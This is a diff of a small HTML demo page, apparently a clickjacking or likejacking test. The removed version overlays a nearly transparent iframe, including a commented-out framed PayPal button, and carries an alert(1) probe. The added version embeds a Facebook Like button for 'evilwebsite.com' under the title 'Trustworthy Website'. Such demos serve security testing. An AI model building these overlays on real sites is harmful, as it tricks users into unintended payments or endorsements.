@@ -1,24 +1,21 @@
-<html>
+<html lang="en">
 <head>
-<link href="whatev.css" type="text/css" rel="stylesheet">
-<title>Clickjack test page</title>
+	<meta charset="utf-8"/>
+	<title>Trustworthy Website</title>
 </head>
 <body>
-<p>Website is vulnerable to clickjacking!</p>
-<!-- <iframe id="bottom" src="hack.html" width="1500"
-height="1500"> </iframe> -->
-<!-- <iframe id="top" src="https://www.paypal.com/webapps/hermes/button?version=4&env=production&style.size=medium&style.layout=vertical&funding.allowed=credit,venmo&sessionID=46171950e0&locale.x=en_US&logLevel=warn&uid=f6713002fd&xcomponent=1" width="1500"
-height="1500"> </iframe> -->
 
-<iframe id="top" src="tw.html" width="1500"
-height="1500"> </iframe>
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.2&appId=766612400101611&autoLogAppEvents=1';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
 
+<div class="fb-like" data-href="https://evilwebsite.com" data-layout="standard" data-action="like" data-size="small" data-show-faces="true" data-share="true">
+</div>
 
-<!-- <script type="text/javascript">alert(1)</script> -->
-
-<style type="text/css">
- #bottom    {position: absolute; top:50px; left:10px; opacity:1.0}
- #top {position: absolute; top:50px; left:50px; opacity:0.2}
-</style>
 </body>
 </html>
